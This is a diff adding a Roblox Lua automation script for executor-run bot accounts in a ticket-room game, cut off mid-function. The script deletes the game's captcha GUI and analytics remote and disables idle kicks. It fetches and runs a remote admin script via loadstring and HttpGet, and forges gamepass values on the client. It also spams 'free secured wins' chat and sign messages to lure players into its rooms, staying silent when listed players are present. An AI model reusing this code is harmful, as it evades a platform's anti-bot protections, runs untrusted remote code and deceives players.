@@ -1,0 +1,1628 @@
+
+--Messages1, Messages3, Messages4 - Bot, Messages5 - Joined, BlacklistedPlayers.
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+task.wait(1)
+
+if getgenv().running then return end
+getgenv().running = true
+
+local whitelistedBots = {
+	"BrooklynnGalaxy2009",
+	"ClawPlayz60",
+	"WyattPho3nix2019",
+	"ChaseThunder2005",
+	"XxViperEchoxX2013",
+	"Oliv3rSparkly2009",
+	"StormEpicHero",
+	"Levi_Eagle2015",
+	"HenryWolf2009",
+	"AvaBaconSpark",
+	"AuroraLight200581",
+	"VictoriaLionFuryYT",
+	"XxPower_DRAGONXX94",
+	"StormDark2004",
+	"DriftMystic2013",
+	"Haz3lMin3r99",
+	"HazelInfern0Flame",
+	"N3onByt32007",
+	"XxEliInf3rn0xX",
+	"N0ahSparklyAlpha",
+	"NoraCrystal87",
+	"Zoom_Silver201541",
+	"NightOrbitDawn36",
+	"OliviaP0wer202097",
+	"Cha0sCircuitPulse202",
+	"EchoPhoenixHyper",
+	"Xx_BaneBlizzardGhost",
+	"Harp3rSkyCod3",
+	"Fr0stVen0mGamer",
+	"Am3lia_Wraith2024"
+}
+
+if not table.find(whitelistedBots, game.Players.LocalPlayer.Name) then return end
+if (game.PlaceId == 9476339275 or game.PlaceId == 12565715282 or game.PlaceId == 12529881925) and game.Players.LocalPlayer.Name ~= "ernesto133488" and game.Players.LocalPlayer.DisplayName ~= "BattleEye" and game.Players.LocalPlayer.DisplayName ~= "EasyAntiCheat" then
+   task.wait(10)
+   setfpscap(30)
+for _, v in ipairs({
+    game:GetService("ReplicatedStorage"):FindFirstChild("Captcha_l"),
+    game:GetService("ReplicatedStorage"):FindFirstChild("RemoteFunction"),
+    game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("CaptchaGui"),
+    game:GetService("StarterGui"):FindFirstChild("CaptchaGui"),
+    game:GetService("ReplicatedStorage").RemoteCalls.General:FindFirstChild("FPS_Analytics")
+}) do if v then v:Destroy() end end
+game:GetService("ReplicatedStorage"):WaitForChild("RemoteCalls"):WaitForChild("GameSpecific"):WaitForChild("Settings"):WaitForChild("UpdateValue"):FireServer("MusicVolume", 0)
+
+getgenv().a = true; getgenv().c = true
+getgenv().d = true; getgenv().e = true
+getgenv().g = true
+getgenv().h = true; getgenv().i = true
+game.Players.LocalPlayer.DataSave.Common.FillOnStart.Gamepasses.SpinnerLuck.Value = true; game.Players.LocalPlayer.DataSave.Common.FillOnStart.Gamepasses.MVP.Value = true
+
+local messages1 = {
+    "Handing out secured wins today 🔒",
+    "Free wins are being dropped right now!",
+    "Waves of secured dubs being given away 🌊",
+    "Giving out wins — no strings attached 🎁",
+    "It’s that time again: free wins for all!",
+    "Hooking people up with clean W’s 💯",
+    "Spreading some free win energy today 🔥",
+    "Got secured wins with your name on them 📦",
+    "Who wants a legit dub? Come grab one!",
+    "W’s being sent left and right — don’t miss out",
+    "Free wins up for grabs — step in!",
+    "I’ve got dubs and I’m handing them out 👐",
+    "Serving secured wins on a silver platter 🍽️",
+    "Come get your W — I’m giving them away 🏆",
+    "Wins being delivered fresh and fast 🚚",
+    "No cap — I’m giving out real wins",
+    "The win line is open — next!",
+    "Take a step in and you might walk out with a W",
+    "Giving wins like it’s a celebration 🎉",
+    "One tap and the W is yours — come claim it",
+    "Open win season 🦅 who’s hunting?",
+    "Lining up wins for anyone ready",
+    "Dub central is active 🟢",
+    "Free wins flying off the shelves 🛒",
+    "Hand-crafted W’s going out today",
+    "Releasing the win wave — be ready 🌊",
+    "Come collect your secured dub 🎯",
+    "Dubs on demand. Just say the word.",
+    "Got a fresh batch of W’s to give out",
+    "Every second, someone’s getting a win 💫",
+    "Spreading win blessings today 🙏",
+    "I’m throwing W’s — grab yours 🪂",
+    "Real wins only — and they’re free right now",
+    "Tossing out dubs like candy 🍬",
+    "Get your win while stocks last!",
+    "You want a win? I got you 🎯",
+    "This room is full of free win energy",
+    "Check in — get rewarded with a W",
+    "W handouts happening now!",
+    "Locked-in wins being unlocked right now 🔓",
+    "Win drop incoming — stay close",
+    "💥 Bang! Another free W delivered",
+    "Giving out wins — claim yours fast!",
+    "The next W might be yours",
+    "I’m on a win-giving streak 🔥",
+    "Who’s next for a secured dub?",
+    "Your win might be up next 🎰",
+    "Dropping W’s like they’re hot 🔥",
+    "Free dubs, no questions asked",
+    "Dubs going live — come through",
+    "W line is moving — step up!",
+    "Wins on deck! Who wants in?",
+    "New round, new wins being given out",
+    "I’ve got your win ready to go 🛫",
+    "Free wins: just step in and stay 🔑",
+    "You show up, I deliver the W",
+    "Pulling names for the next win — could be you",
+    "Giving out legit wins — nothing fake here",
+    "Got another W with your name on it",
+    "Feeding the squad with wins 🍽️",
+    "Next secured win loading...",
+    "Fresh dubs dropping on site 🧊",
+    "Free wins moving fast — better get in line!",
+    "Spinning the W wheel 🎡",
+    "Line up — I’m handing W’s to the real ones",
+    "Broadcasting wins — tune in 📻",
+    "The W machine is back on 🔄",
+    "Right now? I’m giving away wins",
+    "Drop by and pick up your dub",
+    "Doors open, wins flowing in 🌀",
+    "💡 Idea: join in, walk out with a win",
+    "Dubs unlocked and up for grabs 🔓",
+    "Your free win might already be waiting",
+    "Time to give another W — let’s go",
+    "Feeling generous with these dubs today",
+    "Secured wins up for the fastest ones 🏃",
+    "If you’re here, you might already be winning",
+    "That feeling when free wins are rolling in 🎲",
+    "Dropping dubs like blessings 🌧️",
+    "W’s ready for takeoff — next one’s yours ✈️",
+    "Giving away some pure victory today",
+    "Another W just dropped — stay close!",
+    "Sending out dubs with zero delay 🚀",
+    "Come in, vibe, and leave with a win",
+    "Full win cycle engaged ♻️",
+    "This place? Win central 💼",
+    "Distributing dubs like it’s tradition 📜",
+    "I’m in a giving mood — dubs for all!",
+    "Taking names, giving wins",
+    "💬 W chat only — I’m giving them out",
+    "If you’re here, you’ve got a shot at a win",
+    "New day, new dubs getting dropped",
+    "Free win hour starts now 🕒",
+    "If I spot you, you might get a dub",
+    "Slinging W’s all across this room",
+    "Waves of victory rolling in 🌊",
+    "You want it? Come earn it — I’ll back you",
+    "Time to get another dub out the door 📦",
+    "Another round of wins? Absolutely",
+    "Letting wins loose — no leash",
+    "🔥 W alert: I’m dropping them again",
+    "Stacking victories — want one?",
+    "I got one W left... who wants it?",
+    "Moving W’s faster than ever 🏃‍♂️💨",
+    "Good vibes = good wins. I’ve got plenty",
+    "Sharing the dubs with the squad",
+    "Claim your W — just be here",
+    "One click, one win — I’m feeling generous",
+    "Let’s get another one secured",
+    "Dub wave just started. Don’t miss it.",
+    "Posting W’s all day — come collect 🖨️",
+    "I’ve got time and I’ve got wins",
+    "Big win mood right now 💯",
+    "This is the win zone — and it’s active",
+    "Who needs one? I’ve got extras 💸",
+    "Every moment, another win gets claimed",
+    "Sit tight — your W might be coming up"
+}
+
+local messages3 = {
+    "🛡️ Secured wins being handed out right now.",
+    "🎯 Giving out wins that stick — no questions asked.",
+    "🔥 If you're here, you’ve got a chance at a locked-in W.",
+    "🏆 I’m dropping guaranteed dubs — don’t miss out.",
+    "✅ This isn’t luck — I’m actively giving secured wins.",
+    "📦 Real wins, no stress — just claim yours.",
+    "🎉 Wins flowing heavy today — tap in.",
+    "🚪 Step into the room, walk out with a dub.",
+    "💯 Secured wins dropping fast — keep up.",
+    "🧊 You want one? I got one. Secured and cold.",
+    "📢 Dub drop is live — and it’s real.",
+    "🎮 This lobby’s hot — I'm locking in wins.",
+    "🕹️ I'm giving them out right now — clean and easy.",
+    "🚨 Real-time wins being delivered. No delay.",
+    "🛠️ Crafted a few more wins — who’s next?",
+    "📡 Broadcasting free dubs to all tuned in.",
+    "🚀 Another win launched — who caught it?",
+    "🧭 If you're in this room, you're on the map for a win.",
+    "🎲 The dice are gone — it’s just me handing them out.",
+    "🧱 Stack another W — I’ve got more coming.",
+    "👣 Step closer — I’m giving out the real thing.",
+    "💌 You’re invited to collect a clean dub.",
+    "🎁 Giving away a few wins, just because.",
+    "🪙 No coin flips — I just give them out.",
+    "🛡️ Shielded wins only — I got the real thing.",
+    "📬 Dubs being delivered to the right place — here.",
+    "🎯 Locked, loaded, and being passed out.",
+    "🔥 Win storm active — don't blink.",
+    "🧤 I’m not guessing — I’m choosing.",
+    "📣 Real wins, right now, right here.",
+    "🏁 The W line has moved — and it's your turn.",
+    "🌐 Globally announcing: more wins being sent.",
+    "🛎️ You rang? Here's your W.",
+    "🧨 Secured wins lighting up the room.",
+    "📊 My win rate is 100% — because I hand them out.",
+    "🎯 This isn’t a giveaway. It’s a guaranteed handout.",
+    "💬 If you’re reading this, the win might be yours.",
+    "🔒 Just sealed another dub — want one?",
+    "🎟️ No ticket needed — just be here.",
+    "🧠 I'm deciding. You're receiving.",
+    "📌 You’ve been marked for a secured W.",
+    "🪂 Dropping wins right into this room.",
+    "🔔 Another one locked in — next?",
+    "🪄 Real wins, no magic — just facts.",
+    "💫 Giving wins like it’s second nature.",
+    "⚙️ W distribution active. Get close.",
+    "📥 Inbox your win — I’m sending them straight.",
+    "🧃 Fresh wins being poured up.",
+    "🚧 Caution: Win drops ahead.",
+    "🎤 On the mic: I’m giving dubs out right now.",
+    "🌪️ Win wave sweeping the lobby.",
+    "🎈 It’s that kind of session — win time.",
+    "🏗️ Building wins and handing them over.",
+    "👑 Everyone gets a win if you’re quick.",
+    "💣 Dropped a dub. Go claim it.",
+    "🖐️ Giving W’s one by one. Next!",
+    "🔁 Back to back wins coming in.",
+    "🎛️ Flipping switches and handing wins.",
+    "📡 I’m live — win dispatch happening.",
+    "⏱️ It’s that window — I’m giving now.",
+    "🧱 Brick by brick, win by win.",
+    "🚦Green light: win handouts in progress.",
+    "🎨 Each win unique — and I'm the artist.",
+    "🎠 Round and round, next stop: your win.",
+    "📗 Not a rumor — win logs are filling up.",
+    "🗝️ Dubs unlocked, and I’ve got more keys.",
+    "🚿 Showering wins down the room.",
+    "📀 Got a win queued up for delivery.",
+    "🎮 Controller in hand, wins on the line.",
+    "🧃 Juice flowing, wins rolling.",
+    "📎 Attaching wins to names right now.",
+    "🧊 Cold delivery — win status: secured.",
+    "💨 Fast hands giving real W’s.",
+    "📞 Picked up a dub? I’m the reason.",
+    "🏄 I’m surfing the win wave — ride it.",
+    "🌱 Growing the leaderboard one dub at a time.",
+    "🧩 This piece? It’s a win. Yours.",
+    "🎉 Win firework just went off.",
+    "📈 The win count is climbing — get in.",
+    "🌊 The tide’s rising — bringing W’s.",
+    "💡 Bright room = more wins.",
+    "🚦Green lit for W delivery.",
+    "📣 This lobby is loaded with real wins.",
+    "🧭 You found the right room — wins here.",
+    "🔧 Win engine running at full speed.",
+    "🍀 Don’t need luck — I give wins freely.",
+    "📮 Stamped and sealed W’s going out.",
+    "🔑 Unlocking dubs as we speak.",
+    "📚 Stacking up pages of W’s.",
+    "🧯 Too hot with these wins — take one.",
+    "📆 Marked today as win-giving day.",
+    "🖨️ Printing out W’s like a factory.",
+    "🪄 Watch close — another win appears.",
+    "🎤 I said it: secured dubs being handed out.",
+    "💺 Take a seat — win coming your way.",
+    "🔋 Fully charged and dropping wins.",
+    "🪙 No flip — just receive.",
+    "🎶 Playing the dub tune. Hear it?",
+    "📻 Tuned in to win radio.",
+    "🔄 Reloaded and passing out more dubs.",
+    "🧠 You’re thinking about a win? I already gave it.",
+    "📬 Mail’s in. Another W arrived.",
+    "🪂 I’m dropping W’s straight into laps.",
+    "🧯 Dub supply is overstocked — come grab.",
+    "🧠 Handpicked wins going out.",
+    "🚥 Go mode. Dub mode.",
+    "📌 Dub pin active — it’s on your name.",
+    "🚁 Win airlift active.",
+    "🎛️ Routing the next win… loaded.",
+    "🏆 Trophy incoming. Stay alert.",
+    "🎟️ Next in line — your win is ready.",
+    "📦 Shipment of W’s arriving… now.",
+    "🧾 W receipt printed. Yours is next.",
+    "📤 Uploaded a win just for this room.",
+    "💿 Dub disk spinning — and I’m giving out tracks.",
+    "📠 Old school wins, new school flow.",
+    "🎢 The win ride is active — hop on.",
+    "📬 Registered mail — win delivery certified.",
+    "🪩 I’m handing out clean spins and clean wins.",
+    "🔭 Seeing the next win — it’s headed here.",
+    "🎮 Gameplay certified with dubs included.",
+    "📲 Push notification: new win unlocked.",
+    "🛑 Stopping here to drop a W.",
+    "🚛 W delivery parked — who wants one?",
+    "🎤 You heard it here: I’m dropping W’s."
+}
+
+getgenv().WARN_KNOWNSCAMMERS = false 
+getgenv().WARN_KNOWN_SCAMMERS2 = false
+getgenv().WARN_KNOWN_SCAMMERS3 = false
+
+local _TTSERVICE = cloneref(game:GetService('TextChatService'))
+local _TCHANNEL = _TTSERVICE.TextChannels.RBXGeneral
+
+local blacklist = {
+    ["3_Dak"] = true,
+    ["BlueThikFish"] = true,
+    ["0CUH"] = true
+}
+
+local function chat(C_1)
+    for _, v in next, game.Players:GetPlayers() do
+        if blacklist[v.Name] then
+            return 
+        end
+    end
+    _TCHANNEL:SendAsync(C_1)
+end
+
+local knownScammerWarnings1 = { 
+    "🚨 Dvligerzk (red guy) runs scam 'secured win' rooms! They're fake + rigged. Avoid him! — Free Win, Ltd",
+    "⚠️ Dvligerzk tricks players with bots + fake wins. His 'secured wins' are total scams! Stay sharp!",
+    "🛑 That big red guy offering 'secured wins'? Scam alert! Dvligerzk rigs games with cheats + bots!",
+    "👎 Dvligerzk = scammer! He fakes stats + uses bots in his fake 'secured win' rooms. Avoid him!",
+    "🤖 Free Win, Ltd warns: Dvligerzk uses bots to rig rooms. 'Secured wins' are fake every time!",
+    "‼️ Dvligerzk fakes his 'wins' using tools + bots. Don’t trust the red guy with 'secured' lies!",
+    "🔒 Real wins don’t need cheats! Dvligerzk fakes everything. Avoid his 'secured win' traps!",
+    "📛 Dvligerzk = big scammer in red! His 'secured wins' are bait. Don’t fall for it!",
+    "❌ 'Secured wins' from Dvligerzk are all rigged. Stats are faked, bots are used. Stay away!",
+    "📢 Warning: Dvligerzk's rooms are scams with bots + cheats! Don’t join his fake setups!",
+    "🧠 If he says 'check earned' — it's spoofed. Dvligerzk fakes stats + uses bots. Avoid!",
+    "🎭 Those 'secured wins'? All scripted by Dvligerzk. Nothing's real. Stay far from him!",
+    "🚫 Free Win, Ltd says: don’t trust Dvligerzk’s red suit or fake rooms. They're all scams!",
+    "📊 Faked stats ≠ legit. Dvligerzk rigs his matches. Don’t trust anything he shows!",
+    "🧨 Scam alert! Dvligerzk rigs 'secured wins' with bots + cheats. Avoid his trap rooms!",
+    "🔍 Leaderboards prove nothing — Dvligerzk’s wins are fake. Don’t join his scam rooms!",
+    "💣 Dvligerzk manipulates everything: stats, matches, rooms. Nothing is fair. Don’t trust him!",
+    "🎯 Free Win, Ltd confirms: Dvligerzk uses cheats to fake wins. Don’t fall for it!",
+    "👀 Don’t get tricked by Dvligerzk’s red skin + fake confidence. His 'wins' are staged!",
+    "⚔️ Dvligerzk is running scams. His 'secured win' rooms are fake setups. Stay smart!",
+    "💥 Warning! Dvligerzk uses cheats, bots, + fake stats to trick players. Don’t join him!",
+    "⛔ Red guy says 'secured win'? That’s Dvligerzk. It’s all fake. Don’t fall for it!",
+    "🧱 Dvligerzk’s rooms = traps! Faked wins, bots, rigged gameplay. Stay away!",
+    "📉 Free Win, Ltd warns: Dvligerzk fakes everything. His 'wins' mean nothing!",
+    "🔐 Don’t trust the red scammer with fake 'secured wins' — that’s all Dvligerzk does!"
+}
+
+local knownScammerWarnings2 = {
+    "🚨 Xtriker (user: danielperu) uses a 🎟️ sign to lure players. He’s tied to Dvligerzk’s fake win scams. Don’t fall for it!",
+    "⚠️ danielperu (aka Xtriker) is linked to 🟥 Dvligerzk. Their 'secured win' scam is still active. Don’t trust the sign!",
+    "🛑 That guy with the 🎟️ sign? If it’s Xtriker (danielperu), it’s bait. He’s helping Dvligerzk scam rooms!",
+    "🚫 Don’t trust danielperu (Xtriker)! He fakes giveaways with a 🎟️ sign and helps Dvligerzk scam players!",
+    "🔍 Xtriker = danielperu = scammer helper. He uses a 🎟️ sign as bait for Dvligerzk’s fake 'secured win' setup!",
+    "👎 If you see Xtriker (user: danielperu) with a ticket sign 🎟️, run! He’s part of a rigged scam with Dvligerzk.",
+    "🖥️ Arsenal screen + 🎟️ ticket sign = danielperu scam setup. Xtriker works with Dvligerzk. Avoid their rooms!",
+    "🎭 Don’t be fooled by Xtriker’s ticket sign 🎟️. danielperu is helping with Dvligerzk’s fake 'secured wins'.",
+    "❗ danielperu (display name Xtriker) is in on the scam. The 🎟️ sign is just bait. Linked to Dvligerzk!",
+    "🚷 Xtriker holds a 🎟️ sign to look legit — but he's part of Dvligerzk’s fake win scam. Don’t join them!",
+    "🔒 That giveaway setup with Arsenal + 🎟️ sign? It’s a trap by danielperu (Xtriker). He’s linked to Dvligerzk!",
+    "😡 Scam helper alert: danielperu (aka Xtriker) runs fake rooms with 🎟️ signs. He’s part of Dvligerzk’s scam ring!",
+    "📛 danielperu goes by Xtriker and uses fake 🎟️ props to bait players. Don’t fall for Dvligerzk’s crew!",
+    "💣 If Xtriker is around with a 🎟️ sign, don’t join. It’s a scam setup tied to 🟥 Dvligerzk!",
+    "🎮 Watch out: Xtriker (danielperu) fakes being a giveaway helper. He’s part of Dvligerzk’s rigged crew!",
+    "👀 danielperu as Xtriker fakes Arsenal screens 🖥️ and ticket signs 🎟️ to lure you. It’s a scam trap!",
+    "🚨 danielperu (Xtriker) = fake win crew! If you see his 🎟️ sign setup, it’s tied to Dvligerzk’s scam.",
+    "⛔ Xtriker is part of Dvligerzk’s fake win scheme. The 🎟️ dispenser is just bait. Don’t get tricked!",
+    "🧠 danielperu poses as a helper using a 🎟️ sign, but he’s part of the same scam team as Dvligerzk!",
+    "📢 Don’t join any room led by Xtriker (user: danielperu) with a 🎟️ sign — it’s a scam tied to Dvligerzk!"
+}
+
+local knownScammerWarnings3 = {
+    "🚨 Y2K (leothomas27) = scam alert! Big guy in gray suit riding a capybara. Don’t trust his 'secured wins'!",
+    "🛑 That dude with the capybara + gray suit? It’s Y2K (leothomas27). His rooms are totally rigged scams!",
+    "⚠️ Y2K rides a capybara and fakes wins. leothomas27 rigs rooms with cheats. Stay away from him!",
+    "❌ Don’t fall for Y2K’s gray-suit act. leothomas27 is scamming players with capybara bait and fake setups!",
+    "📛 Capybara mount + black jeans = scam setup by leothomas27 (Y2K). His rooms are totally rigged!",
+    "👎 That huge guy on a capybara in gray? That’s Y2K (leothomas27). His 'wins' are all faked!",
+    "🧠 Scam ID: capybara-rider in gray suit = leothomas27. Display name Y2K. Don’t join his rooms!",
+    "🧱 Rooms by Y2K are traps! Big gray suit guy with black jeans and a capybara — he fakes everything!",
+    "🚷 Y2K (aka leothomas27) is part of the fake win crew. His giant capybara setup is all for show!",
+    "💣 Scam spotted! Big guy riding capybara in black jeans = leothomas27 (Y2K). Avoid his setups!"
+}
+
+task.spawn(function()
+    while getgenv().WARN_KNOWNSCAMMERS do 
+        local msg = knownScammerWarnings1[math.random(#knownScammerWarnings1)] 
+        chat(msg)
+        task.wait(math.random(200, 300)) 
+    end
+end)
+
+task.wait(2)
+
+task.spawn(function()
+    while getgenv().WARN_KNOWN_SCAMMERS2 do 
+        local msg = knownScammerWarnings2[math.random(#knownScammerWarnings2)] 
+        chat(msg)
+        task.wait(math.random(300, 400)) 
+    end
+end)
+
+task.wait(4)
+
+task.spawn(function()
+    while getgenv().WARN_KNOWN_SCAMMERS3 do 
+        local msg = knownScammerWarnings3[math.random(#knownScammerWarnings3)] 
+        chat(msg)
+        task.wait(math.random(400, 500)) 
+    end
+end)
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local WaitingForOpponent = PlayerGui:WaitForChild("WaitingForOpponent")["Bottom Middle"].WaitingForOpponent.Background.Inside.DisplayName
+local RemoteCalls = ReplicatedStorage:WaitForChild("RemoteCalls"):WaitForChild("GameSpecific"):WaitForChild("Tickets")
+
+local lastDisplayName = WaitingForOpponent.Text
+local GC = getconnections or get_signal_cons
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+
+for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
+    if v["Disable"] then
+        v["Disable"](v)
+    elseif v["Disconnect"] then
+        v["Disconnect"](v)
+    end
+end
+
+local blacklistedPlayers2 = {"BlueThikFish", "3_Dak", "0CUH", "Kylian_0512", "snoopydrew00", "Anth0nyv", "Dvlig3rzk", "HonoredAlter", "Quert321", "coaiefripte21", "Adyishere3", "kohking1000", "Djgato2020", "mariamalou", "back_noris1", "krishna121232", "DoraThee_Destroyer", "killer_leon1234", "Ditaner", "IamnotUncleDonald", "Robloksprojj", "name147369", "Lucky_DuckyPlayzYT", "aleki2010a"}
+
+local function getRandomMessage()
+    return messages1[math.random(1, #messages1)]
+end
+
+local function randomizeCase(text)
+    local randomized = ""
+    for i = 1, #text do
+        local char = text:sub(i, i)
+        randomized ..= math.random() > 0.5 and char:upper() or char:lower()
+    end
+    return randomized
+end
+
+local function DoesPlayerHaveTicket(ticket)
+	if game.Players.LocalPlayer.DataSave.Common.FillOnStart.Tickets[ticket].Value <= 0 then
+		return false
+	end
+	return true
+end
+
+local function getOwnedTicketPriority()
+    local Priority = { "10", "20", "50" }
+    for _, ticket in ipairs(Priority) do
+        if DoesPlayerHaveTicket(ticket) then
+            return tonumber(ticket)
+        end
+    end
+    return nil
+end
+
+local function signAsync()
+    local RemoteCalls = game.ReplicatedStorage:WaitForChild("RemoteCalls")
+    local LocalPlayer = game.Players.LocalPlayer
+
+    local ticket = getOwnedTicketPriority()
+    local msg = ticket and getRandomMessage() or "My partner is offering free wins, join his game!"
+
+    pcall(function()
+        RemoteCalls.GameSpecific.Sign.ChangeSignText:InvokeServer(msg)
+    end)
+
+    if ticket then
+        task.wait(5)
+        pcall(function()
+            RemoteCalls.GameSpecific.Sign.ChangeSignText:InvokeServer(randomizeCase("Free win " .. ticket))
+        end)
+    end
+end
+
+local function roomAsync()
+    local RemoteCalls = game.ReplicatedStorage:WaitForChild("RemoteCalls")
+    local TicketPriority = getOwnedTicketPriority()
+
+    local AssetMap = {
+        [10] = {"1105949796", "1107050475", "1069666625", "1069648461", "1069152292", "1069752909"},
+        [20] = {"1137334687", "1070407284", "1069873105", "1068526727"},
+        [50] = {"1071147104", "1070241358", "1067975437", "1240902988"}
+    }
+
+    pcall(function()
+        RemoteCalls:WaitForChild("GameSpecific"):WaitForChild("Tickets"):WaitForChild("DestroyRoom"):InvokeServer()
+        task.wait(0.5)
+        RemoteCalls.GameSpecific.DailySpinner.ClaimDailySpinner:InvokeServer()
+        if not TicketPriority then return warn("No valid ticket.") end
+        local chosenAsset = AssetMap[TicketPriority][math.random(1, #AssetMap[TicketPriority])]
+        task.wait(0.5)
+        RemoteCalls.GameSpecific.Tickets.CreateRoom:InvokeServer(
+        "JumpRope",
+        TicketPriority,
+        { assetType = "GamePass", assetId = chosenAsset },
+            true
+        )
+    end)
+end
+
+local function signLoop()
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+
+    local humanoid = character:WaitForChild("Humanoid", 5)
+    local animAsset = game.ReplicatedStorage:WaitForChild("Storage"):WaitForChild("GameSpecific"):WaitForChild("Animations"):FindFirstChild("HoldTool")
+
+    if humanoid and animAsset then
+        task.wait(1)
+        game:GetService("ReplicatedStorage"):WaitForChild("RemoteCalls"):WaitForChild("GameSpecific"):WaitForChild("Sign"):WaitForChild("HoldSign"):FireServer(true)
+        local animation = humanoid:LoadAnimation(animAsset)
+        animation:Play()
+    end
+end
+
+task.spawn(function()
+    while true do
+        roomAsync()
+        task.wait(15)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        signAsync()
+        task.wait(15)
+    end
+end)
+
+signLoop()
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(2)
+    signLoop()
+end)
+---------
+
+local lastMessageTime = 0  
+local cooldown = 5  
+
+local _TTSERVICE = cloneref(game:GetService('TextChatService'))
+local _TCHANNEL = _TTSERVICE.TextChannels.RBXGeneral
+
+local blacklist = {
+    ["3_Dak"] = true,
+    ["BlueThikFish"] = true,
+    ["0CUH"] = true
+}
+
+local function chat(C_1)
+    for _, v in next, game.Players:GetPlayers() do
+        if blacklist[v.Name] then
+            return 
+        end
+    end
+    _TCHANNEL:SendAsync(C_1)
+end
+
+local messages2 = {
+    "{opponent}, free win for you! Do itttt!",
+    "Bro {opponent}, just take the win! Do itttt!",
+    "It’s your free W, {opponent}! Do itttt!",
+    "You win, I lose! Do itttt!",
+    "EZ win for you, {opponent}! Do itttt!",
+    "Don’t even try, just win! Do itttt!",
+    "I won’t even fight back! Do itttt!",
+    "You got this, {opponent}! Do itttt!",
+    "I’ll throw, just take it! Do itttt!",
+    "No effort needed, {opponent}! Do itttt!"
+}
+
+local currentOpponent = nil  
+local messageCount = 0  
+local selectedMessages = {}  
+
+local function loop4()
+    local waitingGui = game:GetService("Players").LocalPlayer.PlayerGui.WaitingForOpponent["Bottom Middle"].WaitingForOpponent
+
+    if waitingGui.Visible == true then
+        local displayText = waitingGui.Background.Inside.DisplayName.Text
+        local playerDisplayName = game.Players.LocalPlayer.DisplayName
+
+        if displayText ~= playerDisplayName.." VS ????" then
+            local opponentName = displayText:match("VS (.+)")
+            if opponentName then
+                if opponentName ~= currentOpponent then  
+                    currentOpponent = opponentName  
+                    messageCount = 0  
+
+                    -- Pick 3 random unique messages
+                    selectedMessages = {}
+                    while #selectedMessages < 3 do
+                        local msg = messages2[math.random(1, #messages2)]
+                        if not table.find(selectedMessages, msg) then
+                            table.insert(selectedMessages, msg)
+                        end
+                    end
+                end
+
+                if messageCount < 3 then
+                    local currentTime = tick()
+                    if currentTime - lastMessageTime >= cooldown then
+                        lastMessageTime = currentTime  
+                        messageCount = messageCount + 1  
+                        local message = selectedMessages[messageCount]:gsub("{opponent}", opponentName)
+                        task.wait(1)
+                        chat(message)
+                    end
+                end
+            end
+        end
+    end
+end
+
+task.spawn(function()
+    while getgenv().e do
+        loop4()
+        task.wait(1)
+    end
+end)
+
+--
+
+local RunService = game:GetService("RunService")
+
+local interval = math.random(10, 15)
+local nextChatTime = tick() + interval
+local chatConnection
+
+getgenv().f = true
+
+-- Disconnect old connection if it exists
+if chatConnection then
+	chatConnection:Disconnect()
+end
+
+chatConnection = RunService.Heartbeat:Connect(function()
+	if not getgenv().f then
+		chatConnection:Disconnect()
+		chatConnection = nil
+		return
+	end
+
+	if tick() >= nextChatTime then
+		local success, err = pcall(function()
+			local randomMessage = messages3[math.random(1, #messages3)]
+			chat(randomMessage)
+			print("-- Jumped at:", tick())
+		end)
+		if not success then
+			warn("Chat error:", err)
+		end
+
+		-- Generate a new interval after each message
+		interval = math.random(10, 15)
+		nextChatTime = tick() + interval
+	end
+end)
+
+--
+
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+local function updateCharacterReferences(newCharacter)
+    character = newCharacter
+    humanoid = character:WaitForChild("Humanoid")
+    hrp = character:WaitForChild("HumanoidRootPart")
+    setupSeatedConnection()
+end
+
+local seatedConnection
+function setupSeatedConnection()
+    if seatedConnection then
+        seatedConnection:Disconnect()
+    end
+    seatedConnection = humanoid.Seated:Connect(function(active, seat)
+        if active then
+            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+            humanoid.Jump = true
+        else
+            humanoid:ChangeState(Enum.HumanoidStateType.Running)
+        end
+    end)
+end
+
+setupSeatedConnection()
+
+player.CharacterAdded:Connect(function(newCharacter)
+    updateCharacterReferences(newCharacter)
+end)
+
+local function getRandomPlayer()
+    local eligiblePlayers = {}
+    for _, otherPlayer in pairs(game.Players:GetPlayers()) do
+        if otherPlayer ~= player and otherPlayer.Character then
+            local otherHRP = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if otherHRP then
+                local distance = (hrp.Position - otherHRP.Position).Magnitude
+                if distance <= 2000 then
+                    table.insert(eligiblePlayers, otherPlayer)
+                end
+            end
+        end
+    end
+    if #eligiblePlayers > 0 then
+        return eligiblePlayers[math.random(1, #eligiblePlayers)]
+    end
+    return nil
+end
+
+local function moveToPlayer(targetPlayer)
+    if targetPlayer and targetPlayer.Character then
+        local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if targetHRP then
+            humanoid:MoveTo(targetHRP.Position)
+        end
+    end
+end
+
+local function loop6()
+    while getgenv().g do
+        if character and humanoid and hrp then
+            local randomPlayer = getRandomPlayer()
+            if randomPlayer then
+                moveToPlayer(randomPlayer)
+            end
+        end
+        task.wait(5)
+    end
+end
+
+task.spawn(loop6)
+
+---
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local jumpInterval = 10
+local lastJumpTime = 0
+local connection
+
+local function jump(humanoid)
+    humanoid.Jump = true
+    task.wait(0.1)
+    humanoid.Jump = false
+    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+end
+
+local function setupJumpLoop(character)
+    local humanoid = character:WaitForChild("Humanoid")
+    
+    if connection then
+        connection:Disconnect()
+    end
+    
+    lastJumpTime = os.clock()
+    
+    connection = game:GetService("RunService").Heartbeat:Connect(function()
+        local currentTime = os.clock()
+        if currentTime - lastJumpTime >= jumpInterval then
+            if humanoid and humanoid.Parent then
+                local state = humanoid:GetState()
+                if state ~= Enum.HumanoidStateType.Jumping and 
+                   state ~= Enum.HumanoidStateType.Freefall then
+                    jump(humanoid)
+                    print("Jumped at:", currentTime)
